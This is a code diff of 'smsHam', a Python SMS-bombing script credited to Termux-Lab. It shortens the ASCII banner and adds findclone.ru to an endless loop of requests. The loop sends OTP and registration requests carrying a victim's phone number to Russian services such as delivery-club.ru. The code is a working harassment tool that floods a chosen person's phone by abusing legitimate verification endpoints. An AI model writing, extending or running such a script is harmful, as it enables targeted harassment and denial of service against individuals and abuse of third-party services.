@@ -2,14 +2,11 @@ import requests, random, datetime, sys, time, argparse, os
 from colorama import Fore, Back, Style
 
 banner = """
- __________________
-|                                                    |
-| [--] Name: smsHam                                  |
-|                                                    |
-| [--] Made in: Termux-Lab                           |
-|                                                    |
-| [--] Vk channel: @termuxlab                        |
-|__________________|
+                     smsHam
+               smsHam       smsHam
+	             smsHam
+Termux-Lab
+Vk: @termuxlab
 """
 
 print(banner)
@@ -331,6 +328,12 @@ while True:
 	try:
 		requests.post('https://www.delivery-club.ru/ajax/user_otp', data={"phone": _phone})
 		print('[+] Delivery отправлено!')
+	except:
+		print('[-] Не отправлено!')
+
+	try:
+		requests.get('https://findclone.ru/register', data={"phone": _phone})
+		print('[+] Findclone отправлено!')
 	except:
 		print('[-] Не отправлено!')
 
